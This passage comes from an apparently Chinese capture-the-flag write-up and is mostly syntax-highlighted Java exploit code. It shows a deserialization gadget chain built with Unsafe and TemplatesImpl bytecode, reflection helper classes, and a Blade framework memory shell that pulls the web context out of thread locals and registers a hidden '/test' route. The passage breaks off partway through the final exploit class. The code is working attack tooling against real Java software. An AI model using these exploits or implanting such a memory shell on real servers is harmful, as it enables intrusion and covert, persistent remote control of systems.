class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();  </span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);  </span><br><span class="line">        vector.add(o1);  </span><br><span class="line">        unsafe.putObject(list2,unsafe.objectFieldOffset(list2.getClass().getDeclaredField(<span class="string">&quot;listenerList&quot;</span>)),<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream).writeObject(list2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">N1ghtObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>)).readObject();</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            field = clazz.getDeclaredField(fieldName);  </span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException var4) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) &#123;  </span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> field;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ReflectionTools</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.n1ght;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.AccessibleObject;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectTools</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReflectTools</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(AccessibleObject member)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        member.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            setAccessible(field);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) &#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(String name) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        setAccessible(ctor);</span><br><span class="line">        <span class="keyword">return</span> ctor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newInstance</span><span class="params">(String className, Object... args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> getFirstCtor(className).newInstance(args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        setAccessible(objCons);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        setAccessible(sc);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span><span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var6) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$EntAry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(Integer.TYPE, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Method <span class="title function_">getDeclaredMethod</span><span class="params">(Class clazz, String methodName, Class[] params)</span> &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(methodName, params);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> method;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Method <span class="title function_">getMethod</span><span class="params">(Class clazz, String methodName, Class[] params)</span> &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getMethod(methodName, params);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> method;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SinkTools</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SinkTools</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SinkTools</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">(<span class="type">byte</span>[] byteCode)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            ReflectTools.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n1ght&quot;</span>);</span><br><span class="line">            ReflectTools.setFieldValue(templates, <span class="string">&quot;_sdom&quot;</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            ReflectTools.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            ReflectTools.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;);</span><br><span class="line">            <span class="keyword">return</span> templates;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Error: &quot;</span> + var2);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是由于本题不出网</p><h2 id="blade内存马"><a href="#blade内存马" class="headerlink" title="blade内存马"></a>blade内存马</h2><p>获取Context</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">       Class&lt;?&gt; name = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> name.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">       theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafe.get(<span class="literal">null</span>);</span><br><span class="line">       <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">       ThreadLocal&lt;Object&gt; objectThreadLocal = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">       <span class="type">Method</span> <span class="variable">getMap</span> <span class="operator">=</span> ThreadLocal.class.getDeclaredMethod(<span class="string">&quot;getMap&quot;</span>, Thread.class);</span><br><span class="line">       getMap.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">threadLocals</span> <span class="operator">=</span> getMap.invoke(objectThreadLocal, thread);</span><br><span class="line">       Class&lt;?&gt; threadLocalMap = Class.forName(<span class="string">&quot;java.lang.ThreadLocal$ThreadLocalMap&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">tablesFiled</span> <span class="operator">=</span> threadLocalMap.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">       tablesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">table</span> <span class="operator">=</span> tablesFiled.get(threadLocals);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Array.getLength(table); i++) &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> Array.get(table, i);</span><br><span class="line">               System.out.println(o1.getClass().getName());</span><br><span class="line">               <span class="keyword">if</span>(o1.getClass().getName().equals(<span class="string">&quot;java.lang.ThreadLocal$ThreadLocalMap$Entry&quot;</span>))&#123;</span><br><span class="line">                   o = Array.get(table, i);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       System.out.println(o);</span><br><span class="line">       Class&lt;?&gt; entry = Class.forName(<span class="string">&quot;java.lang.ThreadLocal$ThreadLocalMap$Entry&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">valueField</span> <span class="operator">=</span> entry.getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">       valueField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">InternalThreadLocalMap</span> <span class="variable">value</span> <span class="operator">=</span> (InternalThreadLocalMap) valueField.get(o);</span><br><span class="line">       <span class="type">WebContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.size(); i++) &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (value.indexedVariable(i).getClass().getName().equals(<span class="string">&quot;com.hellokaton.blade.mvc.WebContext&quot;</span>)) &#123;</span><br><span class="line">                   context = (WebContext) value.indexedVariable(i);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>可以看到RouteMethodHandler的routeHandle逻辑</p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701080206-9007yco.png" alt="image"></p><p>首先要注解为@Path，然后有返回类型，获取的方法</p><p>也就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Route</span> <span class="variable">route</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Route</span>(HttpMethod.ALL, <span class="string">&quot;/test&quot;</span>, Exp.class, Exp.class.getDeclaredMethod(<span class="string">&quot;exp&quot;</span>));</span><br></pre></td></tr></table></figure><p>这样看如何注册route</p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701080439-ecpze85.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701080532-1zyk06n.png" alt="image"></p><p>可以看到我们将他加入到routeMatcher和staticMapping里面即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChannelHandlerContext</span> <span class="variable">channelHandlerContext</span> <span class="operator">=</span> context.getChannelHandlerContext();</span><br><span class="line">      <span class="type">HttpServerHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (HttpServerHandler) channelHandlerContext.handler();</span><br><span class="line">      <span class="type">RouteMethodHandler</span> <span class="variable">routeHandler</span> <span class="operator">=</span> (RouteMethodHandler) unsafe.getObject(handler, unsafe.objectFieldOffset(HttpServerHandler.class.getDeclaredField(<span class="string">&quot;routeHandler&quot;</span>)));</span><br><span class="line">      <span class="type">RouteMatcher</span> <span class="variable">routeMatcher</span> <span class="operator">=</span> (RouteMatcher) unsafe.getObject(routeHandler, unsafe.objectFieldOffset(RouteMethodHandler.class.getDeclaredField(<span class="string">&quot;routeMatcher&quot;</span>)));</span><br><span class="line">      <span class="type">Path</span> <span class="variable">annotation</span> <span class="operator">=</span> Exp.class.getAnnotation(Path.class);</span><br><span class="line">      System.out.println(<span class="string">&quot;annotations: &quot;</span> + annotation);</span><br><span class="line">      <span class="type">Route</span> <span class="variable">route</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Route</span>(HttpMethod.ALL, <span class="string">&quot;/test&quot;</span>, Exp.class, Exp.class.getDeclaredMethod(<span class="string">&quot;exp&quot;</span>));</span><br><span class="line">      route.setTarget(<span class="keyword">new</span> <span class="title class_">Exp</span>(<span class="string">&quot;aaa&quot;</span>));</span><br><span class="line">      <span class="type">Method</span> <span class="variable">addRoute</span> <span class="operator">=</span> routeMatcher.getClass().getDeclaredMethod(<span class="string">&quot;addRoute&quot;</span>, Route.class);</span><br><span class="line">      addRoute.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      addRoute.invoke(routeMatcher,route);</span><br><span class="line">      System.out.println(routeHandler);</span><br><span class="line">      <span class="type">StaticMapping</span> <span class="variable">staticMapping</span> <span class="operator">=</span> routeMatcher.getStaticMapping();</span><br><span class="line">      staticMapping.addRoute(<span class="string">&quot;/test&quot;</span>,HttpMethod.ALL,route);</span><br></pre></td></tr></table></figure><p>这边的<code>new Exp(&quot;aaa&quot;)</code>​</p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701080640-8k1k77d.png" alt="image"></p><p>防止陷入回环地址</p><p>所以整个的exp是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n1ght;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.hellokaton.blade.annotation.Path;</span><br><span class="line"><span class="keyword">import</span> com.hellokaton.blade.mvc.WebContext;</span><br><span class="line"><span class="keyword">import</span> com.hellokaton.blade.mvc.http.*;</span><br><span class="line"><span class="keyword">import</span> com.hellokaton.blade.mvc.route.Route;</span><br><span class="line"><span class="keyword">import</span> com.hellokaton.blade.mvc.route.RouteMatcher;</span><br><span class="line"><span class="keyword">import</span> com.hellokaton.blade.mvc.route.mapping.StaticMapping;</span><br><span class="line"><span class="keyword">import</span> com.hellokaton.blade.server.HttpServerHandler;</span><br><span class="line"><span class="keyword">import</span> com.hellokaton.blade.server.RouteMethodHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.ChannelHandlerContext;</span><br><span class="line"><span class="keyword">import</span> io.netty.util.internal.InternalThreadLocalMap;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span 